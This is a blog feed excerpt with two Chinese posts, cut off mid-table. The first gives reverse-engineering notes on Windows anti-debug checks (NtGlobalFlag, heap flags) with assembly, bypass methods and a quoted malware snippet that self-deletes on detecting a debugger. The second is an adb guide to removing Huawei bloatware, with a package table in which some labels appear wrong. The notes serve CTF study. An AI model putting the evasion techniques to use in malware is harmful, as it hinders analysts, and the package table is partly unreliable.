        <content type="html"><![CDATA[<h1 id="反调试技术-1-各种标志"><a href="#反调试技术-1-各种标志" class="headerlink" title="反调试技术(1)_各种标志"></a>反调试技术(1)_各种标志</h1><p>总之就是记录各种用于防止反调试的字段，感觉没啥用。</p><p>参考、摘抄自：<a href="https://ctf-wiki.org/reverse/windows/anti-debug">https://ctf-wiki.org/reverse/windows/anti-debug</a></p><h2 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h2><h3 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h3><p>在 32 位机器上, <code>NtGlobalFlag</code>字段位于<code>PEB</code>(进程环境块)<code>0x68</code>的偏移处, 64 位机器则是在偏移<code>0xBC</code>位置. 该字段的默认值为 0，当调试器运行时，该字段有时会被更改（不一定）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLG_HEAP_ENABLE_TAIL_CHECK (0x10)</span><br><span class="line">FLG_HEAP_ENABLE_FREE_CHECK (0x20)</span><br><span class="line">FLG_HEAP_VALIDATE_PARAMETERS (0x40)</span><br></pre></td></tr></table></figure><p>程序中可能会对该字段进行检测，若不为00就直接跳转到<code>being_debugged</code></p><p>注：<code>NtGlobalFlag</code>的那 3 个标志位只有当程序是<code>由调试器创建</code>, 而非<code>由调试器附加</code>上去的进程时, 才会被设置.</p><h3 id="检测方式-32位"><a href="#检测方式-32位" class="headerlink" title="检测方式    (32位)"></a>检测方式    (32位)</h3><p>注：fs寄存器指向当前活动线程的TEB</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220304165757871.png" alt="image-20220304165757871"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] ;Process Environment Block（）</span><br><span class="line">mov al, [eax+68h] ;NtGlobalFlag</span><br><span class="line">and al, 70h</span><br><span class="line">cmp al, 70h</span><br><span class="line">je being_debugged</span><br></pre></td></tr></table></figure><h3 id="更改初值（并不知道有啥用）"><a href="#更改初值（并不知道有啥用）" class="headerlink" title="更改初值（并不知道有啥用）"></a>更改初值（并不知道有啥用）</h3><p>注册表<code>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager</code>的<code>GlobalFlag</code>的值会替换进行<code>NtGlobalFlag</code>字段。（重启后生效）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220304164126021.png" alt="image-20220304164126021"></p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ul><li>手动修改标志位的值 (<code>FLG_HEAP_ENABLE_TAIL_CHECK</code>, <code>FLG_HEAP_ENABLE_FREE_CHECK</code>, <code>FLG_HEAP_VALIDATE_PARAMETERS</code>)</li><li>在 Ollydbg 中使用<code>hide-debug</code>插件</li><li>在 Windbg 禁用调试堆的方式启动程序 (<code>windbg -hd program.exe</code>)</li></ul><p><strong>示例（32位）：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov eax, large fs:30h   ; PEB struct loaded into EAX</span><br><span class="line">mov eax, [eax+68h]      ; NtGlobalFlag (offset 0x68 relative to PEB) saved to EAX</span><br><span class="line">sub eax, 70h            ; Value 0x70 corresponds to all flags on (FLG_HEAP_ENABLE_TAIL_CHECK, FLG_HEAP_ENABLE_FREE_CHECK, FLG_HEAP_VALIDATE_PARAMETERS)</span><br><span class="line">mov [ebp+var_1828], eax</span><br><span class="line">cmp [ebp+var_1828], 0   ; Check whether 3 debug flags were on (result of substraction should be 0 if debugged)</span><br><span class="line">jnz short loc_4035B5    ; No debugger, program continues...</span><br><span class="line">call s_selfDelete       ; ...else, malware deleted</span><br></pre></td></tr></table></figure><p>断在<code>mov eax, [eax+68h]</code>处，使用<code>CommandLine</code>插件用<code>dump fs:[30]+0x68</code>dump 出<code>NtGlobalFlag</code>的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/manually_set_peb_ntglobalflag.png" alt="Manually-set-peb-ntglobalflag.png"></p><p>右键选择<code>Binary-&gt;Fill with 00&#39;s</code>将值<code>0x70</code>替换为<code>0x00</code>即可。</p><h2 id="Heap-Flags"><a href="#Heap-Flags" class="headerlink" title="Heap Flags"></a>Heap Flags</h2><p><code>Heap flags</code>包含有两个与<code>NtGlobalFlag</code>一起初始化的标志: <code>Flags</code>和<code>ForceFlags</code>。改字段的值与调试器和Windows的版本都有关。</p><blockquote><ul><li>Flags 字段:<ul><li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>Flags</code>位于堆的<code>0x0C</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x40</code>偏移处.</li><li>在 64 位 Windows XP 中, <code>Flags</code>字段位于堆的<code>0x14</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x70</code>偏移处.</li></ul></li><li>ForceFlags 字段:<ul><li>在 32 位 Windows NT, Windows 2000 和 Windows XP 中, <code>ForceFlags</code>位于堆的<code>0x10</code>偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于<code>0x44</code>偏移处.</li><li>在 64 位 Windows XP 中, <code>ForceFlags</code>字段位于堆的<code>0x18</code>偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于<code>0x74</code>偏移处.</li></ul></li></ul></blockquote><p>总之呢，在各种情况下会有各种的取值，具体的需要根据情况而定。</p><h2 id="The-Heap"><a href="#The-Heap" class="headerlink" title="The Heap"></a>The Heap</h2><p><a href="https://ctf-wiki.org/reverse/windows/anti-debug/the-heap/">https://ctf-wiki.org/reverse/windows/anti-debug/the-heap/</a></p><p>看不太懂，复杂，目前先不记录。</p><p>总之就是，在某些字段成立时，用特定的字段填写在堆的尾部，不知道是怎么做到的，迷惑。。</p><ul><li>如果设置了<code>HEAP_TAIL_CHECKING_ENABLED</code>标志 (见<code>Heap Flags</code>节), 那么在 32 位 windows 中就会在分配的堆块尾部附加 2 个<code>0xABABABAB</code>(64 位环境就是 4 个).</li><li>如果设置了<code>HEAP_FREE_CHECKING_ENABLED</code>(见<code>Heap Flags</code>节) 标志, 那么当需要额外的字节来填充堆块尾部时, 就会使用<code>0xFEEEFEEE</code>(或一部分) 来填充</li></ul>]]></content>
      
      
      <categories>
          
          <category> re-Note </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>huawei系统软件卸载</title>
      <link href="/2022/03/04/huawei%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E5%8D%B8%E8%BD%BD/"/>
      <url>/2022/03/04/huawei%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6%E5%8D%B8%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="huawei系统软件卸载"><a href="#huawei系统软件卸载" class="headerlink" title="huawei系统软件卸载"></a>huawei系统软件卸载</h1><p>参考，摘抄自：<a href="http://www.usbmi.com/5700.html">http://www.usbmi.com/5700.html</a></p><p><em>正常操作的情况下，安卓手机的控制只需要单用户即可，因此卸载用户目录下的软件即可，不需要从系统目录连根拔起斩尽杀绝（这样刷机的时候还能恢复）</em></p><p><strong>第一步：</strong></p><p>手机的”设置”—“系统”—“开发人员选项”，界面下滑找到”调试”，打开“USB调试”、“连接USB时总是弹出提示”“监控ADB安装应用”、“仅充电模式下允许USB调试”这四个选项，有些不让选也影响不大。</p><p><strong>第二步：</strong></p><p>电脑下载调试工具包    ADB Kits</p><p>数据线连接电脑和手机，连接后在手机选择<code>仅充电</code></p><p>手机还会有一条连接确认，确认即可。</p><p><strong>第三步：</strong></p><p>adb命令(做打码处理)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxx\Desktop\Andriod\adb&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">KWG5Txxxxxx07xx5        device</span><br></pre></td></tr></table></figure><p>说明已经连接了设备，下面就可以操作了</p><p><strong>第四步：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取系统当前用户的安装列表：</span><br><span class="line">adb shell pm list packages &gt;alist.txt</span><br><span class="line">已启用的应用列表:</span><br><span class="line">adb shell pm list packages -s -e &gt;enabled.txt</span><br></pre></td></tr></table></figure><p>输出到文件方便查看。</p><p><strong>第五步：</strong></p><p>开始动手!</p><p>禁用命令格式：<code>adb shell pm disable-user 软件包名</code></p><p>启用命令格式：<code>adb shell pm enable 软件包名</code></p><p>删除命令格式：<code>adb shell pm uninstall --user 0 软件包名</code></p><p><strong>附录1，常见软件包名称对应</strong></p><p>摘抄自：<a href="http://www.8fe.com/jiaocheng/1201.html%EF%BC%88%E4%B8%AA%E4%BA%BA%E8%AE%A4%E4%B8%BA%E9%9D%9E%E5%B8%B8%E5%85%A8%E9%9D%A2%E4%BA%86%EF%BC%89">http://www.8fe.com/jiaocheng/1201.html（个人认为非常全面了）</a></p><p>直接找到相应的包名执行命令开删就可以了！</p><table><thead><tr><th align="center">包名</th><th align="center">应用名称</th></tr></thead><tbody><tr><td align="center">com.android.networkstack.inprocess</td><td align="center"></td></tr><tr><td align="center">com.android.providers.downloads</td><td align="center">下载管理器</td></tr><tr><td align="center">com.huawei.android.totemweather</td><td align="center">天气</td></tr><tr><td align="center">com.huawei.desktop.explorer</td><td align="center">我的文件</td></tr><tr><td align="center">com.huawei.arengine.service</td><td align="center">华为AR引擎</td></tr><tr><td align="center">com.google.android.overlay.settingsProvider</td><td align="center"></td></tr><tr><td align="center">com.android.soundrecorder</td><td align="center">录音机</td></tr><tr><td align="center">com.google.android.configupdater</td><td align="center"></td></tr><tr><td align="center">com.android.mms.service</td><td align="center">短信服务</td></tr><tr><td align="center">com.android.companiondevicemanager</td><td align="center"></td></tr><tr><td align="center">com.huawei.imedia.dolby</td><td align="center">杜比音效</td></tr><tr><td align="center">com.google.android.ext.shared</td><td align="center"></td></tr><tr><td align="center">com.google.android.onetimeinitializer</td><td align="center">谷歌one time</td></tr><tr><td align="center">com.huawei.desktop.systemui</td><td align="center"></td></tr><tr><td align="center">com.huawei.multimedia.audioengine</td><td align="center"></td></tr><tr><td align="center">com.huawei.numberidentity</td><td align="center"></td></tr><tr><td align="center">com.huawei.KoBackup</td><td align="center">备份</td></tr><tr><td align="center">com.google.ar.core</td><td align="center">谷歌AR服务</td></tr><tr><td align="center">com.android.nfc</td><td align="center">NFC服务</td></tr><tr><td align="center">com.android.mms</td><td align="center">信息</td></tr><tr><td align="center">com.huawei.systemserver</td><td align="center">系统服务</td></tr><tr><td align="center">com.android.ons</td><td align="center"></td></tr><tr><td align="center">com.huawei.himovie.partner1</td><td align="center"></td></tr><tr><td align="center">com.huawei.cloud</td><td align="center">华为云</td></tr><tr><td align="center">com.huawei.profile</td><td align="center">华为Profile</td></tr><tr><td align="center">com.huawei.himovie.partner2</td><td align="center"></td></tr><tr><td align="center">com.android.contacts</td><td align="center">联系人</td></tr><tr><td align="center">com.android.systemui.overlay</td><td align="center"></td></tr><tr><td align="center">com.android.simappdialog</td><td align="center"></td></tr><tr><td align="center">com.android.vending</td><td align="center">Google Play商店</td></tr><tr><td align="center">com.android.frameworkhwext.honor</td><td align="center"></td></tr><tr><td align="center">com.huawei.wallet.sdk.walletsdk</td><td align="center"></td></tr><tr><td align="center">com.android.modulemetadata</td><td align="center"></td></tr><tr><td align="center">com.android.providers.media</td><td align="center">媒体存储</td></tr><tr><td align="center">com.huawei.bluetooth</td><td align="center">通过蓝牙导入</td></tr><tr><td align="center">com.android.email</td><td align="center">电子邮件</td></tr><tr><td align="center">com.android.providers.blockednumber</td><td align="center">存储已屏蔽的号码</td></tr><tr><td align="center">com.android.wallpaperbackup</td><td align="center">壁纸备份</td></tr><tr><td align="center">com.Qunar</td><td align="center">去哪儿</td></tr><tr><td align="center">com.google.android.gsf.login</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.android.mirrorshare</td><td align="center">无线分享</td></tr><tr><td align="center">com.svox.pico</td><td align="center">Pico TTS</td></tr><tr><td align="center">com.android.packageinstaller</td><td align="center">打包安装程序</td></tr><tr><td align="center">com.android.frameworkhwext.overlay.dark</td><td align="center">安卓框架</td></tr><tr><td align="center">com.google.android.printservice.readb</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.android.hwpay</td><td align="center">华为钱包安全支付</td></tr><tr><td align="center">com.android.imedia.syncplay</td><td align="center"></td></tr><tr><td align="center">com.android.providers.userdictionary</td><td align="center">用户词典</td></tr><tr><td align="center">com.android.providers.telephony</td><td align="center">通话/信息存储</td></tr><tr><td align="center">com.huawei.android.launcher</td><td align="center">华为桌面</td></tr><tr><td align="center">com.huawei.camerakit.impl</td><td align="center"></td></tr><tr><td align="center">com.huawei.androidx</td><td align="center">AndroidX</td></tr><tr><td align="center">com.android.phone.recorder</td><td align="center">录音机</td></tr><tr><td align="center">com.huawei.hidisk</td><td align="center">文件管理</td></tr><tr><td align="center">com.huawei.featurelayer.featureframework</td><td align="center"></td></tr><tr><td align="center">com.android.providers.calendar</td><td align="center">日历存储</td></tr><tr><td align="center">com.huawei.android.tips</td><td align="center"></td></tr><tr><td align="center">com.huawei.camera</td><td align="center">相机</td></tr><tr><td align="center">com.android.exchange</td><td align="center">Exchange服务</td></tr><tr><td align="center">com.baidu.haokan</td><td align="center">好看视频</td></tr><tr><td align="center">com.smile.gifmaker</td><td align="center">gif制造商</td></tr><tr><td align="center">com.huawei.hiskytone</td><td align="center">天际通</td></tr><tr><td align="center">com.huawei.nlp</td><td align="center"></td></tr><tr><td align="center">cn.wps.moffice_eng</td><td align="center">WPS</td></tr><tr><td align="center">com.android.hwmirror</td><td align="center">镜子</td></tr><tr><td align="center">com.huawei.dmsdp</td><td align="center"></td></tr><tr><td align="center">com.huawei.hicar</td><td align="center">华为汽车</td></tr><tr><td align="center">com.huawei.hiboard</td><td align="center">负一屏</td></tr><tr><td align="center">com.huawei.ihealth</td><td align="center">华为健康</td></tr><tr><td align="center">com.huawei.yellowpage</td><td align="center">在线黄页</td></tr><tr><td align="center">com.huawei.internetaudioservice</td><td align="center">智能线控</td></tr><tr><td align="center">com.huawei.livewallpaper.matewenty</td><td align="center">华山</td></tr><tr><td align="center">com.google.android.backuptransport</td><td align="center">谷歌备份传输</td></tr><tr><td align="center">com.huawei.android.thememan</td><td align="center">主题</td></tr><tr><td align="center">com.ifytek.speechsuite</td><td align="center">讯飞语音引擎</td></tr><tr><td align="center">com.android.inputmethod.latin</td><td align="center">AOSP输入法</td></tr><tr><td align="center">com.android.providers.contacts</td><td align="center">联系人存储</td></tr><tr><td align="center">com.android.permissioncontroller</td><td align="center">安卓权限控制</td></tr><tr><td align="center">com.huawei.assetsync</td><td align="center"></td></tr><tr><td align="center">com.android.systemui</td><td align="center">系统界面</td></tr><tr><td align="center">com.huawei.hwvoipservice</td><td align="center"></td></tr><tr><td align="center">com.huawei.assetsyncservice</td><td align="center"></td></tr><tr><td align="center">com.android.bluetooth</td><td align="center">蓝牙</td></tr><tr><td align="center">com.huawei.hff</td><td align="center">hff服务</td></tr><tr><td align="center">com.huawei.aod</td><td align="center">灭屏显示</td></tr><tr><td align="center">com.android.vebding</td><td align="center">谷歌play商店</td></tr><tr><td align="center">com.andeoid.wallpaper.livepicker</td><td align="center">稻穗屏保</td></tr><tr><td align="center">com.szzc.ucar.pilot</td><td align="center">神州租车</td></tr><tr><td align="center">com.amap.android.ams</td><td align="center">高德位置服务</td></tr><tr><td align="center">com.huawei.remoteassistant</td><td align="center">远程协助</td></tr><tr><td align="center">com.autonavi.minimap</td><td align="center">高德地图</td></tr><tr><td align="center">ctrip.android.view</td><td align="center">携程旅行</td></tr><tr><td align="center">com.huawei.retaildemo</td><td align="center">演示程序</td></tr><tr><td align="center">com.huawei.android.location.activityrecognition</td><td align="center">行为识别</td></tr><tr><td align="center">com.huawei.geofence</td><td align="center">地理围栏</td></tr><tr><td align="center">com.stupeflix.replay</td><td align="center">Quik</td></tr><tr><td align="center">com.ifeng.news2</td><td align="center">凤凰新闻</td></tr><tr><td align="center">com.nuance.swype.emui</td><td align="center">华为Swype输入法</td></tr><tr><td align="center">com.dianping.v1</td><td align="center">大众点评</td></tr><tr><td align="center">com.google.android.ext.services</td><td align="center">android Services Library</td></tr><tr><td align="center">com.huawei.locationsharing</td><td align="center">位置共享</td></tr><tr><td align="center">com.huawei.cryptosms.service</td><td align="center">短信加密</td></tr><tr><td align="center">com.android.defcontainer</td><td align="center">软件包访问帮助程序</td></tr><tr><td align="center">com.realvnc.android.remote</td><td align="center">VNC远程控制</td></tr><tr><td align="center">com.android.deskclock</td><td align="center">时钟</td></tr><tr><td align="center">com.android.location.fused</td><td align="center">融合定位</td></tr><tr><td align="center">com.google.android.syncadapters.contacts</td><td align="center"></td></tr><tr><td align="center">com.android.server.telecom</td><td align="center">通话管理</td></tr><tr><td align="center">com.google.android.webview</td><td align="center">安卓内置浏览器</td></tr><tr><td align="center">com.android.gallery3d</td><td align="center">图库</td></tr><tr><td align="center">android.ext.services</td><td align="center"></td></tr><tr><td align="center">com.google.android.gsf</td><td align="center">谷歌服务框架</td></tr><tr><td align="center">com.google.android.gms</td><td align="center">谷歌play服务</td></tr><tr><td align="center">com.google.android.overlay.gmsconfig</td><td align="center"></td></tr><tr><td align="center">androidx.camera.extensions.impl</td><td align="center"></td></tr><tr><td align="center">com.android.providers.settings</td><td align="center"></td></tr><tr><td align="center">com.huawei.livewallpaper.matetwenty</td><td align="center"></td></tr><tr><td align="center">com.android.calendar</td><td align="center">日历</td></tr><tr><td align="center">com.android.incallui</td><td align="center">拨号</td></tr><tr><td align="center">com.huawei.systemmanager</td><td align="center">手机管家</td></tr><tr><td align="center">com.huawei.securityserver</td><td align="center"></td></tr><tr><td align="center">com.android.se</td><td align="center"></td></tr><tr><td align="center">com.google.android.partnersetup</td><td align="center">谷歌合作伙伴设置</td></tr><tr><td align="center">com.android.localtransport</td><td align="center"></td></tr><tr><td align="center">com.android.calculator2</td><td align="center">计算器</td></tr><tr><td align="center">com.huawei.deviceauth</td><td align="center"></td></tr><tr><td align="center">com.android.networkstack.permissionconfig</td><td align="center"></td></tr><tr><td align="center">com.huawei.android.remotecontroller</td><td align="center">华为智能遥控</td></tr><tr><td align="center">com.huawei.android.hwupgradeguide</td><td align="center">升级向导</td></tr><tr><td align="center">com.android.huawei.HiMediaEngine</td><td align="center">定制多媒体引擎</td></tr><tr><td align="center">com.android.shell</td><td align="center"></td></tr><tr><td align="center">com.android.phone</td><td align="center">拨号</td></tr><tr><td align="center">com.android.settings</td><td align="center"></td></tr><tr><td align="center">com.qeexo.smartshot</td><td align="center">智能截屏</td></tr><tr><td align="center">com.huawei.vrservice</td><td align="center">华为VR眼镜服务</td></tr><tr><td align="center">com.huawei.compass</td><td align="center">指南针</td></tr><tr><td align="center">com.google.android.printservice.recommendation</td><td align="center"></td></tr><tr><td align="center">com.huawei.android.dsdscardmanager</td><td align="center">双卡管理</td></tr><tr><td align="center">com.tencent.qqlivehuawei</td><td align="center">腾讯视频华为版</td></tr><tr><td align="center">com.huawei.powergenie</td><td align="center">省电精灵</td></tr><tr><td align="center">com.android.apps.tag</td><td align="center">标记</td></tr><tr><td align="center">com.huawei.watch.sync</td><td align="center">手表应用同步</td></tr><tr><td align="center">com.ss.android.ugc.aweme</td><td align="center">抖音短视频</td></tr><tr><td align="center">com.huawei.mmitest</td><td align="center">华为测试组件</td></tr><tr><td align="center">com.android.wallpaper.livepicker</td><td align="center">动态壁纸</td></tr><tr><td align="center">com.huawei.android.wfdft</td><td align="center">WLAN直连</td></tr><tr><td align="center">com.huawei.android.instantonline</td><td align="center">华为一键热点应用</td></tr><tr><td align="center">com.huawei.android.projectmenu</td><td align="center">工程菜单</td></tr><tr><td align="center">com.android.vpndialogs</td><td align="center">VPN设置</td></tr><tr><td align="center">com.huawei.android.pushagent</td><td align="center">推送服务</td></tr><tr><td align="center">com.android.cts.ctsshim</td><td align="center">旅行助手</td></tr><tr><td align="center">com.android.dreams.phototable</td><td align="center">图片屏保程序</td></tr><tr><td align="center">com.huawei.hitouch</td><td align="center">Hi Touch功能</td></tr><tr><td align="center">com.huawei.vassistant</td><td align="center">语音助手</td></tr><tr><td align="center">com.android.onetimeinitializer</td><td align="center">一次性</td></tr><tr><td align="center">com.huawei.hilink.framework</td><td align="center">智能家居连接服务</td></tr><tr><td align="center">com.huawei.hwstartupguide</td><td align="center">安装向导</td></tr><tr><td align="center">com.android.calllogbackup</td><td align="center">通讯录备份</td></tr><tr><td align="center">com.android.managedprovisioning</td><td align="center">工作资料设置</td></tr><tr><td align="center">com.android.proxyhandler</td><td align="center">处理器信息</td></tr><tr><td align="center">com.huawei.fido.uafclient</td><td align="center">在线快速验证</td></tr><tr><td align="center">com.android.emergency</td><td align="center">个人紧急信息</td></tr><tr><td align="center">com.huawei.ims</td><td align="center">华为云镜像服务</td></tr><tr><td align="center">com.huawei.hwpolicyservice</td><td align="center">华为旅行助手服务管理</td></tr><tr><td align="center">com.huawei.hwapplet</td><td align="center">旅行助手策略管理</td></tr><tr><td align="center">com.huawei.hicard</td><td align="center">卡片管理</td></tr><tr><td align="center">com.huawei.hiview</td><td align="center">状态栏通知有关</td></tr><tr><td align="center">com.huawei.trustspace</td><td align="center">支付保护中心</td></tr><tr><td align="center">com.huawei.spaceservice</td><td align="center">云空间</td></tr><tr><td align="center">com.huawei.fastapp</td><td align="center">快应用中心</td></tr><tr><td align="center">com.huawei.hisuite</td><td align="center">华为手机助手</td></tr><tr><td align="center">com.android.captiveportallogin</td><td align="center">Captive Portal Login</td></tr><tr><td align="center">com.huawei.bd</td><td align="center">用户体验计划</td></tr><tr><td align="center">com.huawei.hwdetectrepair</td><td align="center">智能检测</td></tr><tr><td align="center">com.android.bluetoothmidiservice</td><td align="center">蓝牙模组</td></tr><tr><td align="center">com.huawei.ca</td><td align="center">ca服务</td></tr><tr><td align="center">com.huawei.android.karaoke</td><td align="center">K歌特效</td></tr><tr><td align="center">com.huawei.rcsserviceapplication</td><td align="center">华为rcs服务</td></tr><tr><td align="center">com.huawei.hiaction</td><td align="center">智能识屏中控模块</td></tr><tr><td align="center">com.android.inputdevices</td><td align="center">输入设备</td></tr><tr><td align="center">com.android.frameworkres.overlay</td><td align="center"></td></tr><tr><td align="center">com.android.externalstorage</td><td align="center">外部存储设备</td></tr><tr><td align="center">com.android.documentsui</td><td align="center">文件</td></tr><tr><td align="center">com.huawei.secime</td><td align="center">华为安全输入法</td></tr><tr><td align="center">com.android.htmlviewer</td><td align="center">HTML查看器</td></tr><tr><td align="center">com.huawei.regservice</td><td align="center">注册服务</td></tr><tr><td align="center">com.huawei.trustcircle</td><td align="center">支付保护中心</td></tr><tr><td align="center">com.huawei.wallet</td><td align="center">华为钱包</td></tr><tr><td align="center">com.iflytek.speechsuite</td><td align="center">讯飞语音引擎</td></tr><tr><td align="center">com.huawei.parentcontrol</td><td align="center">学生模式</td></tr><tr><td align="center">com.huawei.recsys</td><td align="center">华为智能系统还原</td></tr><tr><td align="center">com.huawei.iaware</td><td align="center">智能优化</td></tr><tr><td align="center">com.huawei.android.UEInfoCheck</td><td align="center">自注册短信</td></tr><tr><td align="center">com.huawei.synergy</td><td align="center">输入设备</td></tr><tr><td align="center">com.huawei.android.chr</td><td align="center">HwChrService</td></tr><tr><td align="center">com.android.wallpapercropper</td><td align="center">壁纸裁剪器</td></tr><tr><td align="center">com.huawei.intelligent</td><td align="center">情景智能</td></tr><tr><td align="center">com.huawei.android.FloatTasks</td><td align="center">悬浮导航</td></tr><tr><td align="center">com.huawei.nearby</td><td align="center">华为附近</td></tr><tr><td align="center">com.huawei.phoneservice</td><td align="center">会员服务</td></tr><tr><td align="center">com.huawei.iconnect</td><td align="center">智能家居连接</td></tr><tr><td align="center">com.android.statementservice</td><td align="center">Intent Filter Verification Services</td></tr><tr><td align="center">com.huawei.trustagent</td><td align="center">智能解锁</td></tr><tr><td align="center">com.huawei.android.instantshare</td><td align="center">Huawei Share</td></tr><tr><td align="center">com.huawei.android.internal.app</td><td align="center">Huawei Share</td></tr><tr><td align="center">com.huawei.hwasm</td><td align="center"></td></tr><tr><td align="center">com.android.printspooler</td><td align="center">打印处理服务</td></tr><tr><td align="center">com.android.sharedstoragebackup</td><td align="center"></td></tr><tr><td align="center">com.huawei.wifiprobqeservice</td><td align="center">WiFi服务</td></tr><tr><td align="center">com.android.backupconfirm</td><td align="center">第三方的应用程序</td></tr><tr><td align="center">com.android.stk</td><td align="center">sim应用</td></tr><tr><td align="center">com.android.pacprocessor</td><td align="center">电脑连接辅助</td></tr><tr><td align="center">com.huawei.hiviewtunnel</td><td align="center">电量优化</td></tr><tr><td align="center">com.huawei.android.AutoRegSms</td><td align="center">自动注册</td></tr><tr><td align="center">com.android.frameworkhwext.HONOR</td><td align="center">荣耀框架</td></tr><tr><td align="center">com.android.certinstaller</td><td align="center">证书安装器</td></tr><tr><td align="center">com.android.mtp</td><td align="center">MTP服务</td></tr><tr><td align="center">com.android.frameworkhwext.dark</td><td align="center"></td></tr><tr><td align="center">com.huawei.printservice</td><td align="center">谷歌组件</td></tr><tr><td align="center">com.huawei.featurelayer.sharedfeature.map</td><td align="center">华为地图服务</td></tr><tr><td align="center">com.huawei.motionservice</td><td align="center">手势服务</td></tr><tr><td align="center">com.sankuai.meituan</td><td align="center">美团</td></tr><tr><td align="center">com.huawei.health</td><td align="center">运动健康</td></tr><tr><td align="center">org.simalliance.openmobileapi.service</td><td align="center">SmartcardService</td></tr><tr><td align="center">com.huawei.hnreader</td><td align="center">荣耀阅读</td></tr><tr><td align="center">com.huawei.vdrive</td><td align="center">驾驶模式</td></tr><tr><td align="center">companiondevicemanager</td><td align="center">系统状态栏</td></tr><tr><td align="center">com.huawei.android.FMRadio</td><td align="center">收音机</td></tr><tr><td align="center">com.android.dreams.basic</td><td align="center">基本互动屏保</td></tr><tr><td align="center">com.huawei.tips</td><td align="center">智能提醒</td></tr><tr><td align="center">com.huawei.gameassistant</td><td align="center">游戏助手</td></tr><tr><td align="center">com.android.storagemanager</td><td align="center">存储设备管理</td></tr><tr><td align="center">com.huawei.scanner</td><td align="center">扫一扫</td></tr><tr><td align="center">com.huawei.mycenter</td><td align="center">会员中心</td></tr><tr><td align="center">com.huawei.contactscamcard</td><td align="center">名片全能王</td></tr><tr><td align="center">com.huawei.hwireader</td><td align="center">华为阅读</td></tr><tr><td align="center">com.android.browser</td><td align="center">浏览器</td></tr><tr><td align="center">com.huawei.hwvplayer.youku</td><td align="center">华为视频优酷版</td></tr><tr><td align="center">com.taobao.mobile.dipei</td><td align="center"></td></tr><tr><td align="center">com.hicloud.android.clone</td><td align="center">手机克隆</td></tr><tr><td align="center">com.xunmeng.pinduoduo</td><td align="center">拼多多</td></tr><tr><td align="center">com.huawei.HwMultiScreenShot</td><td align="center">滚动截屏</td></tr><tr><td align="center">com.ss.android.article.news</td><td align="center">今日头条</td></tr><tr><td align="center">com.UCMobile</td><td align="center">UC浏览器</td></tr><tr><td align="center">com.android.keychain</td><td align="center">密钥链</td></tr><tr><td align="center">com.example.android.notepad</td><td align="center">备忘录</td></tr><tr><td align="center">com.huawei.nb.service</td><td align="center">可删可禁用</td></tr><tr><td align="center">com.huawei.lives</td><td align="center">生活</td></tr><tr><td align="center">com.google.android.marvin.talkback</td><td align="center">TalkBack</td></tr><tr><td align="center">com.android.carrierconfig</td><td align="center">运营商配置</td></tr><tr><td align="center">com.android.systEMUI.overlay</td><td align="center">主题界面</td></tr><tr><td align="center">com.huawei.fans</td><td align="center">花粉俱乐部</td></tr><tr><td align="center">com.baidu.searchbox</td><td align="center">百度搜素</td></tr><tr><td align="center">com.huawei.gamebox</td><td align="center">华为游戏中心</td></tr><tr><td align="center">com.wuba</td><td align="center">58同城</td></tr><tr><td align="center">com.unionpay.tsmservice</td><td align="center">tsm服务</td></tr><tr><td align="center">com.huawei.hifolder</td><td align="center">精品推荐</td></tr><tr><td align="center">com.huawei.screenrecorder</td><td align="center">屏幕录制</td></tr><tr><td align="center">com.huawei.browser</td><td align="center">浏览器</td></tr><tr><td align="center">com.android.mediacenter</td><td align="center">音乐</td></tr><tr><td align="center">com.huawei.android.hiaidsengine</td><td align="center">屏幕录制</td></tr><tr><td align="center">com.huawei.contentsensor</td><td align="center">取词</td></tr><tr><td align="center">com.huawei.msdp</td><td align="center">综合传感信息处理平台</td></tr><tr><td align="center">com.huawei.suggestion</td><td align="center">情景智能</td></tr><tr><td align="center">com.huawei.search</td><td align="center">智慧搜索</td></tr><tr><td align="center">com.huawei.himovie</td><td align="center">华为视频</td></tr><tr><td align="center">com.huawei.android.findmyphone</td><td align="center">查找我的手机</td></tr><tr><td align="center">com.huawei.android.airsharing</td><td align="center">多屏互动</td></tr><tr><td align="center">com.huawei.skytone</td><td align="center">天际通数据服务</td></tr><tr><td align="center">com.huawei.hbs.framework</td><td align="center"></td></tr><tr><td align="center">com.huawei.lbs</td><td align="center">HwLBSService</td></tr><tr><td align="center">com.huawei.smartlocation</td><td align="center"></td></tr><tr><td 